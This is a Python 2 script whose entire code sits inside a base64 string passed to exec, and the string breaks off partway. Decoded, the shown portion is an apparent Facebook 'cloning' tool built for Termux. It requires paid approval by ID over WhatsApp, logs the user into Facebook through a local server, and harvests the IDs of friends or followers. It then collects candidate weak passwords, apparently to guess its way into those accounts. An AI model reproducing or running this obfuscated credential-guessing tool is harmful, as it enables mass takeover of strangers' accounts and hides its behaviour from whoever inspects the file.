import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24yCiMgY29kaW5nPXV0Zi04CgppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IHJlCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IGpzb24KaW1wb3J0IHJhbmRvbQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGNvb2tpZWxpYgppbXBvcnQgdXVpZApmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sCmZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yCl9fYXV0aG9yX18gPSAnTXItUm9ib3QnCl9fY29weXJpZ2h0ID0gJ0FsbCByaWdodHMgcmVzZXJ2ZWQgLiBDb3B5cmlnaHQgIE1yLVJvYm90Jwpvcy5zeXN0ZW0oJ3Rlcm11eC1zZXR1cC1zdG9yYWdlJykKCnRyeToKICAgIG9zLm1rZGlyKCcvc2RjYXJkL2lkcycpCmV4Y2VwdCBPU0Vycm9yOgogICAgcGFzcwoKYmQgPSByYW5kb20ucmFuZGludCgyZSswNywgM2UrMDcpCnNpbSA9IHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkKCmhlYWRlciA9IHsKICAgICd4LWZiLWNvbm5lY3Rpb24tYmFuZHdpZHRoJzogcmVwcihiZCksCiAgICAneC1mYi1zaW0taG5pJzogcmVwcihzaW0pLAogICAgJ3gtZmItbmV0LWhuaSc6IHJlcHIoc2ltKSwKICAgICd4LWZiLWNvbm5lY3Rpb24tcXVhbGl0eSc6ICdFWENFTExFTlQnLAogICAgJ3gtZmItY29ubmVjdGlvbi10eXBlJzogJ2NlbGwuQ1RSYWRpb0FjY2Vzc1RlY2hub2xvZ3lIU0RQQScsCiAgICAndXNlci1hZ2VudCc6ICdEYWx2aWsvMS42LjAgKExpbnV4OyBVOyBBbmRyb2lkIDQuNC4yOyBOWDU1IEJ1aWxkL0tPVDU1MDYpIFtGQkFOL0ZCNEE7RkJBVi8xMDYuMC4wLjI2LjY4O0ZCQlYvNDU5MDQxNjA7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MTkyMH07RkJMQy9pdF9JVDtGQlJWLzQ1OTA0MTYwO0ZCQ1IvUG9zdGVNb2JpbGU7RkJNRi9hc3VzO0ZCQkQvYXN1cztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9BU1VTX1owMEFEO0ZCU1YvNS4wO0ZCT1AvMTtGQkNBL3g4Njphcm1lYWJpLXY3YTtdJywKICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICd4LWZiLWh0dHAtZW5naW5lJzogJ0xpZ2VyJyB9Cm9zLnN5c3RlbSgnZ2l0IHB1bGwnKQpvcy5zeXN0ZW0oJ2NsZWFyJykKCgojIyMjIGNvbG91cnMgIyMjIwpCPSdcMDMzWzE7OTRtJwpSPSdcMDMzWzE7OTFtJwpHPSdcMDMzWzE7OTJtJwpXPSdcMDMzWzE7OTdtJwpTPSdcMDMzWzE7OTZtJwpQPSdcMDMzWzE7OTVtJwpZPSdcMDMzWzE7OTNtJwoKI0RldjpYdHlsaXNoIFBhdGhhbmkKIyMjIyBMT0dPICMjIyMKbG9nbyA9ICIiIiAgClwwMzNbMTs5N20gKioqKioqKioqKioqKioqKiIqKioqKioqKioqKioqKioqKgpcMDMzWzE7OTZtICrilojilojilojilZfilpHilpHilpHilojilojilojilZfilojilojilojilojilojilojilZfilpHilpHilojilojilojilojilojilojilZfilpEgKkYqClwwMzNbMTs5NW0gKuKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWkSAqQSoKXDAzM1sxOzk0bSAq4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paR4paR4paI4paI4pWX4paRICpNKgpcMDMzWzE7OTNtICrilojilojilZHilZrilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilZDilZ3ilpHilojilojilZHilpHilpHilZrilojilojilZcgKkkqClwwMzNbMTs5Mm0gKuKWiOKWiOKVkeKWkeKVmuKVkOKVneKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWkeKWkeKWkeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAqTCoKXDAzM1sxOzkxbSAq4pWa4pWQ4pWd4paR4paR4paR4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWd4paR4paR4paR4paR4paR4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paRICpZKgpcMDMzWzE7OTJtICAgICAgICAgICAgICAgICAgICAg8J+EsfCfhYHwn4Sw8J+EvfCfhLMgICAgICAgIApcMDMzWzE7OTdtICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKXDAzM1sxOzkzbSAgU0NSSVBUIE1BS0VSICA6ICBYVFlMSVNIIFBBVEhBTkkKXDAzM1sxOzk2bSAgR0FORyBPV05FUiAgICA6ICBaQUlOIFggTU9JWgpcMDMzWzE7OTVtICBOT1RFICAgICAgICAgIDogIE9OTFkgRk9SIEdBTkcgClwwMzNbMTs5NG0gIEJFIE9SSUdJTkFMIExFVFMgVEhFIFdPUkxEIENPUFkgVQpcMDMzWzE7OTdtICAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKIiIiCgpkZWYgcmVnKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHByaW50ICcnCiAgICBwcmludCAnXDAzM1sxOzMxOzFtVGFrZSBUaGUgRnJlZSBBcHByb3ZhbCBGb3IgTG9naW4nCiAgICBwcmludCAnJwogICAgdGltZS5zbGVlcCgxKQogICAgCiAgICB0cnk6CiAgICAgICAgdG8gPSBvcGVuKCcvc2RjYXJkLy5oc3QudHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgIHJlZzIoKQoKICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9wYXRoYW5pNDA0L01QRy9tYWluL3NlcnZlci50eHQnKS50ZXh0CiAgICBpZiB0byBpbiByOgogICAgICAgIG9zLnN5c3RlbSgnY2QgLi4uLi4gJiYgbnBtIGluc3RhbGwnKQogICAgICAgIG9zLnN5c3RlbSgnZnVzZXIgLWsgNTAwMC90Y3AgJicpCiAgICAgICAgb3Muc3lzdGVtKCcjJykKICAgICAgICBvcy5zeXN0ZW0oJ2NkIC4uLi4uICYmIG5vZGUgaW5kZXguanMgJicpCiAgICAgICAgdGltZS5zbGVlcCgyKQogICAgICAgIGlwKCkKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50ICdcdEFwcHJvdmVkIEZhaWxlZCcKICAgICAgICBwcmludCAnIFwwMzNbMTs5Mm1Zb3VyIElkIElzIE5vdCBBcHByb3ZlZCBBbHJlYWR5ICcKICAgICAgICBwcmludCAnIFwwMzNbMTs5Mm1Db3B5IHRoZSBpZCBhbmQgc2VuZCB0byBhZG1pbicKICAgICAgICBwcmludCAnIFwwMzNbMTs5Mm1Zb3VyIGlkOiAnICsgdG8KICAgICAgICByYXdfaW5wdXQoJ1wwMzNbMTs5M20gUHJlc3MgZW50ZXIgdG8gc2VuZCBpZCcpCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLys5MjM0MTQ1NDcxNDknKQogICAgICAgIHJlZygpCgoKZGVmIHJlZzIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgJ1x0QXBwcm92YWwgbm90IGRldGVjdGVkJwogICAgcHJpbnQgJyBcMDMzWzE7OTJtQ29weSBrciBrIHNlbmQga3JvIFdoYXRzYXBwIHB5IHRvIGNvbnRpbnVlJwogICAgaWQgPSB1dWlkLnV1aWQ0KCkuaGV4Wzo1MF0KICAgIHByaW50ICcgWW91ciBpZDogJyArIGlkCiAgICBwcmludCAnJwogICAgcmF3X2lucHV0KCcgUHJlc3MgZW50ZXIgdG8gZ28gdG8gV2hhdHNhcHAgJykKICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93YS5tZS8rOTIzNDE0NTQ3MTQ5JykKICAgIHNhdiA9IG9wZW4oJy9zZGNhcmQvLmhzdC50eHQnLCAndycpCiAgICBzYXYud3JpdGUoaWQpCiAgICBzYXYuY2xvc2UoKQogICAgcmF3X2lucHV0KCdcMDMzWzE7OTJtIFByZXNzIGVudGVyIHRvIGNoZWNrIEFwcHJvdmFsICcpCiAgICByZWcoKQoKCmRlZiBpcCgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCAnXHRDb2xsZWN0aW5nIGRldmljZSBpbmZvJwogICAgCiAgICB0cnk6CiAgICAgICAgaXBpbmZvID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vaXAtYXBpLmNvbS9qc29uLycpCiAgICAgICAgeiA9IGpzb24ubG9hZHMoaXBpbmZvLnRleHQpCiAgICAgICAgaXBzID0gelsncXVlcnknXQogICAgICAgIGNvdW50cnkgPSB6Wydjb3VudHJ5J10KICAgICAgICByZWdpID0gelsncmVnaW9uTmFtZSddCiAgICAgICAgbmV0d29yayA9IHpbJ2lzcCddCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKICAgIHByaW50ICdcMDMzWzE7OTJtIFlvdXIgaXA6ICcgKyBpcHMKICAgIHRpbWUuc2xlZXAoMikKICAgIHByaW50ICdcMDMzWzE7OTJtIFlvdXIgY291bnRyeTogJyArIGNvdW50cnkKICAgIHRpbWUuc2xlZXAoMikKICAgIHByaW50ICdcMDMzWzE7OTJtIFlvdXIgcmVnaW9uOiAnICsgcmVnaQogICAgdGltZS5zbGVlcCgyKQogICAgcHJpbnQgJyBcMDMzWzE7OTJtWW91ciBuZXR3b3JrOiAnICsgbmV0d29yawogICAgdGltZS5zbGVlcCgyKQogICAgcHJpbnQgJyBMb2FkaW5nIC4uLicKICAgIHRpbWUuc2xlZXAoMikKICAgIGxvZ19tZW51KCkKCQoKZGVmIGxvZ19tZW51KCk6CiAgICAKICAgIHRyeToKICAgICAgICB0X2NoZWNrID0gb3BlbignYWNjZXNzX3Rva2VuLnR4dCcsICdyJykKICAgICAgICBtZW51KCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnXDAzM1sxOzkwbSAqKioqKioqKipMb2dpbiBtZW51KioqKioqKioqXDAzM1sxOzk0bScKCXByaW50IDQ3ICogJy0nCiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5Mm1bMV0gTG9naW4gd2l0aCBGYWNlQm9vaycKICAgICAgICBwcmludCAnXDAzM1sxOzkybVsyXSBMb2dpbiB3aXRoIHRva2VuJwogICAgICAgIHByaW50ICdcMDMzWzE7OTJtWzNdIE1QRyBCcmFuZCcKICAgICAgICBwcmludCAnJwogICAgICAgIGxvZ19tZW51X3MoKQoKCgpkZWYgbG9nX21lbnVfcygpOgogICAgcyA9IHJhd19pbnB1dCgnIFwwMzNbMTs5N23ilbDilIBNUEfinqQgJykKICAgIGlmIHMgPT0gJzEnOgogICAgICAgIGxvZ19mYigpCiAgICBlbGlmIHMgPT0gJzInOgogICAgICAgIGxvZ190b2tlbigpCiAgICBlbGlmIHMgPT0gJzMnOgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9mYWNlYm9vay5jb20vcXV5eWFtLmphZmFyLycpCiAgICBlbHNlOgogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgJ1xcIFNlbGVjdCB2YWxpZCBvcHRpb24gJwogICAgICAgIHByaW50ICcnCiAgICAgICAgbG9nX21lbnVfcygpCgoKZGVmIGxvZ19mYigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCAnXDAzM1sxOzMxOzFtTG9naW4gd2l0aCBpZC9wYXNzJwogICAgcHJpbnQgNDcgKiAnLScKICAgIGxpZCA9IHJhd19pbnB1dCgnXDAzM1sxOzkybSBJZC9tYWlsL25vOiAnKQogICAgcHdkcyA9IHJhd19pbnB1dCgnIFwwMzNbMTs5M21QYXNzd29yZDogJykKICAgIAogICAgdHJ5OgogICAgICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9sb2NhbGhvc3Q6NTAwMC9hdXRoP2lkPScgKyB1aWQgKyAnJnBhc3M9JyArIHB3ZCkudGV4dAogICAgICAgIHEgPSBqc29uLmxvYWRzKGRhdGEpCiAgICAgICAgaWYgJ2xvYycgaW4gcToKICAgICAgICAgICAgdHMgPSBvcGVuKCdhY2Nlc3NfdG9rZW4udHh0JywgJ3cnKQogICAgICAgICAgICB0cy53cml0ZShxWydsb2MnXSkKICAgICAgICAgICAgdHMuY2xvc2UoKQogICAgICAgICAgICBtZW51KCkKICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvciddOgogICAgICAgICAgICBwcmludCAnIFVzZXIgbXVzdCB2ZXJpZnkgYWNjb3VudCBiZWZvcmUgbG9naW4nCiAgICAgICAgICAgIHJhd19pbnB1dCgnXDAzM1sxOzkybSBQcmVzcyBlbnRlciB0byB0cnkgYWdhaW4gJykKICAgICAgICAgICAgbG9nX2ZiKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCAnIElkL1Bhc3MgbWF5IGJlIHdyb25nJwogICAgICAgICAgICByYXdfaW5wdXQoJyBcMDMzWzE7OTJtUHJlc3MgZW50ZXIgdG8gdHJ5IGFnYWluICcpCiAgICAgICAgICAgIGxvZ19mYigpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQgJycKICAgICAgICBwcmludCAnRXhpdGluZyB0b29sJwogICAgICAgIG9zLnN5c3RlbSgnZXhpdCcpCgoKCmRlZiBsb2dfdG9rZW4oKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgJ1wwMzNbMTs5M21Mb2dpbiB3aXRoIHRva2VuXDAzM1sxOzkxbScKICAgIHByaW50IDQ3ICogJy0nCiAgICB0b2sgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTJtUGFzdGUgdG9rZW4gaGVyZTogXDAzM1sxOzkxbScpCiAgICBwcmludCA0NyAqICctJwogICAgdF9zID0gb3BlbignYWNjZXNzX3Rva2VuLnR4dCcsICd3JykKICAgIHRfcy53cml0ZSh0b2spCiAgICB0X3MuY2xvc2UoKQogICAgbWVudSgpCgoKZGVmIG1lbnUoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgCiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCdhY2Nlc3NfdG9rZW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50ICdcMDMzWzE7MzE7MW1Mb2dpbiBGQiBpZCB0byBjb250aW51ZScKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9nX21lbnUoKQoKICAgIAogICAgdHJ5OgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pCiAgICAgICAgcSA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgIHogPSBxWyduYW1lJ10KICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnJwogICAgICAgIHByaW50ICdcdCBBY2NvdW50IENoZWVrcG9pbnRceDFiWzA7OTdtJwogICAgICAgIHByaW50ICcnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgYWNjZXNzX3Rva2VuLnR4dCcpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ19tZW51KCkKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJycKICAgICAgICBwcmludCAnXHQgVHVybiBvbiBtb2JpbGUgZGF0YS93aWZpXHgxYlswOzk3bScKICAgICAgICBwcmludCAnJwogICAgICAgIHJhd19pbnB1dCgnIFwwMzNbMTs5Mm1QcmVzcyBlbnRlciBhZnRlciB0dXJuaW5nIG9uIG1vYmlsZSBkYXRhL3dpZmkgJykKICAgICAgICBtZW51KCkKCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHRvayA9IG9wZW4oJy9zZGNhcmQvLmhzdC50eHQnLCAncicpLnJlYWQoKQogICAgcHJpbnQgJyAgXDAzM1sxOzkybUxvZ2dlZCBpbiB1c2VyOiBcMDMzWzE7OTRtJyArIHoKICAgIHByaW50IDQ3ICogJy0nCiAgICBwcmludCAnIFwwMzNbMTs5MG0gQWN0aXZlIHRva2VuOiBcMDMzWzE7OTRtJyArIHRvawogICAgcHJpbnQgJyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bMV0gU3RhcnQgQ2xvbmluZycgCiAgICBwcmludCAnXDAzM1sxOzkybVsyXSBGb2xsb3cgTVBHIE9XTkVSJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bM10gVmlldyB0b2tlbicKICAgIHByaW50ICdcMDMzWzE7OTJtWzRdIExvZ291dCcKICAgIHByaW50ICdcMDMzWzE7OTJtWzVdIERlbGV0ZSB0cmFzaCBmaWxlcycKICAgIG1lbnVfcygpCgoKZGVmIG1lbnVfcygpOgogICAgbXMgPSByYXdfaW5wdXQoJ1wwMzNbMTs5N23ilbDilIBNUEfinqQgJykKICAgIGlmIG1zID09ICcxJzoKICAgICAgICBhdXRvX2NyYWNrKCkKICAgIGVsaWYgbXMgPT0gJzInOgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9mYWNlYm9vay5jb20vcXV5eWFtLmphZmFyLycpCiAgICBlbGlmIG1zID09ICczJzoKICAgICAgICB2X3RvaygpCiAgICBlbGlmIG1zID09ICc0JzoKICAgICAgICBsb3V0KCkKICAgIGVsaWYgbXMgPT0gJzUnOgogICAgICAgIHJ0cmFzaCgpCiAgICAgICAgCiAgICBlbHNlOgogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgJ1x0U2VsZWN0IHZhbGlkIG9wdGlvbicKICAgICAgICBwcmludCAnJwogICAgICAgIG1lbnVfcygpCiAgICAgICAgCmRlZiBjcmFjaygpOgogICAgZ2xvYmFsIHRva2V0CiAgICAKICAgIHRyeToKCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgoJb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50ICdcdCBGaWxlIE5vdCBGb3VuZCBceDFiWzA7OTdtJwogICAgICAgIHByaW50ICcnCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ19tZW51KCkKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgJ1wwMzNbMTs5MG1+fn5+IENob2ljZSBwYXNzIGNyYWNraW5nIH5+fn5cMDMzWzE7OTRtJwogICAgcHJpbnQgNDcgKiAnLScKICAgIHByaW50ICdcMDMzWzE7OTJtWzFdIFB1YmxpYyBpZCBjbG9uaW5nJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bMl0gRm9sbG93ZXJzIGNsb25pbmcnCiAgICBwcmludCAnXDAzM1sxOzkybVszXSBGaWxlIGNsb25pbmcnCiAgICBwcmludCAnXDAzM1sxOzkybVswXSBCYWNrJwogICAgYV9zKCkKCmRlZiBhdXRvX2NyYWNrKCk6CiAgICBnbG9iYWwgdG9rZW4KICAgIAogICAgdHJ5OgogICAgICAgIHRva2VuID0gb3BlbignYWNjZXNzX3Rva2VuLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJ1x0IExvZ2luIEZCIGlkIHRvIGNvbnRpbnVlXHgxYlswOzk3bScKICAgICAgICBwcmludCAnJwogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dfbWVudSgpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCAnXDAzM1sxOzkwbX5+fn4gQ2hvaWNlIHBhc3MgY3JhY2tpbmcgfn5+flwwMzNbMTs5NG0nCiAgICBwcmludCA0NyAqICctJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bMV0gUHVibGljIGlkIGNsb25pbmcnCiAgICBwcmludCAnXDAzM1sxOzkybVsyXSBGb2xsb3dlcnMgY2xvbmluZycKICAgIHByaW50ICdcMDMzWzE7OTJtWzNdIEZpbGUgY2xvbmluZycKICAgIHByaW50ICdcMDMzWzE7OTJtWzBdIEJhY2snCiAgICBhX3MoKQoKCmRlZiBhX3MoKToKICAgIGlkID0gW10KICAgIGNwcyA9IFtdCiAgICBva3MgPSBbXQogICAgYV9zID0gcmF3X2lucHV0KCcgXDAzM1sxOzk3beKVsOKUgE1QR+KepCAnKQogICAgaWYgYV9zID09ICcxJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJyBcMDMzWzE7OTBtRm9yLWV4YW1wbGUgOiBcMDMzWzE7OTdtMjM0NTY3LDMzNDQ1NSw0NDU1NjYsNTU2Njc3XDAzM1sxOzk0bScKICAgICAgICBwcmludCA0NyAqICctJwogICAgICAgIHBhc3MxID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVsxXVBhc3N3b3JkOiAnKQogICAgICAgIHBhc3MyID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVsyXVBhc3N3b3JkOiAnKQogICAgICAgIHBhc3MzID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVszXVBhc3N3b3JkOiAnKQogICAgICAJcGFzczQgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTJtWzRdUGFzc3dvcmQ6ICcpCiAgICAgICAgaWR0ID0gcmF3X2lucHV0KCcgXDAzM1sxOzkzbVvimIVdRW50ZXIgaWQ6ICcpCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaWR0ICsgJz9hY2Nlc3NfdG9rZW49JyArIHRva2VuKQogICAgICAgICAgICBxID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgIHogPSBxWyduYW1lJ10KICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgIHByaW50IGxvZ28KICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMTs5MG1+fn5+Q2hvaWNlIHB1YmxpYyBjcmFja2luZ35+fn4nCiAgICAgICAgICAgIHByaW50ICcgXDAzM1sxOzkybUNsb25pbmcgZnJvbTogJyArIHoKICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICAgICAgcHJpbnQgJ1x0IEludmFsaWQgdXNlciBceDFiWzA7OTdtJwogICAgICAgICAgICByYXdfaW5wdXQoJyBcMDMzWzE7OTJtUHJlc3MgZW50ZXIgdG8gdHJ5IGFnYWluICcpCiAgICAgICAgICAgIGF1dG9fY3JhY2soKQoKICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaWR0ICsgJy9mcmllbmRzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgIGZvciBpIGluIHpbJ2RhdGEnXToKICAgICAgICAgICAgdWlkID0gaVsnaWQnXQogICAgICAgICAgICBuYSA9IGlbJ25hbWUnXQogICAgICAgICAgICBubSA9IG5hLnJzcGxpdCgnICcpWzBdCiAgICAgICAgICAgIGlkLmFwcGVuZCh1aWQgKyAnfCcgKyBubSkKICAgICAgICAKICAgIGVsaWYgYV9zID09ICcyJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJyBcMDMzWzE7OTBtRm9yLWV4YW1wbGUgOiBcMDMzWzE7OTdtMjM0NTY3LDMzNDQ1NSw0NDU1NjYsNTU2Njc3XDAzM1sxOzk0bScKICAgICAgICBwcmludCA0NyAqICctJwogICAgICAgIHBhc3MxID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVsxXVBhc3N3b3JkOiAnKQogICAgICAgIHBhc3MyID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVsyXVBhc3N3b3JkOiAnKQogICAgICAgIHBhc3MzID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVszXVBhc3N3b3JkOiAnKQoJcGFzczQgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTJtWzRdUGFzc3dvcmQ6ICcpCiAgICAgICAgaWR0ID0gcmF3X2lucHV0KCcgXDAzM1sxOzkzbVvimIVdRW50ZXIgaWQ6ICcpCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaWR0ICsgJz9hY2Nlc3NfdG9rZW49JyArIHRva2VuKQogICAgICAgICAgICBxID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgIHogPSBxWyduYW1lJ10KICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgIHByaW50IGxvZ28KICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMTs5MG1+fn5+IENob2ljZSBmb2xsb3dlcnMgY3JhY2tpbmcgfn5+ficKICAgICAgICAgICAgcHJpbnQgJyBcMDMzWzE7OTJtQ2xvbmluZyBmcm9tOiAnICsgegogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgICAgICBwcmludCAnXHQgSW52YWxpZCB1c2VyIFx4MWJbMDs5N20nCiAgICAgICAgICAgIHJhd19pbnB1dCgnXDAzM1sxOzkybVByZXNzIGVudGVyIHRvIHRyeSBhZ2FpbiAnKQogICAgICAgICAgICBhdXRvX2NyYWNrKCkKCiAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkdCArICcvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPScgKyB0b2tlbiArICcmbGltaXQ9OTk5OTk5JykKICAgICAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgZm9yIGkgaW4gelsnZGF0YSddOgogICAgICAgICAgICB1aWQgPSBpWydpZCddCiAgICAgICAgICAgIG5hID0gaVsnbmFtZSddCiAgICAgICAgICAgIG5tID0gbmEucnNwbGl0KCcgJylbMF0KICAgICAgICAgICAgaWQuYXBwZW5kKHVpZCArICd8JyArIG5tKQogICAgICAgIAogICAgZWxpZiBhX3MgPT0gJzMnOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnIFwwMzNbMTs5MG1Gb3ItZXhhbXBsZSA6IFwwMzNbMTs5N20yMzQ1NjcsMzM0NDU1LDQ0NTU2Niw1NTY2NzdcMDMzWzE7OTRtJwogICAgICAgIHByaW50IDQ3ICogJy0nCiAgICAgICAgcGFzczEgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTJtWzFdUGFzc3dvcmQ6ICcpCiAgICAgICAgcGFzczIgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTJtWzJdUGFzc3dvcmQ6ICcpCiAgICAgICAgcGFzczMgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTJtWzNdUGFzc3dvcmQ6ICcpCglwYXNzNCA9IHJhd19pbnB1dCgnIFwwMzNbMTs5Mm1bNF1QYXNzd29yZDogJykKICAgICAgICB0cnk6CgkgICAgaWRsaXN0PSByYXdfaW5wdXQoJ1srXSBGaWxlIE5hbWU6ICcpCgkgICAgZm9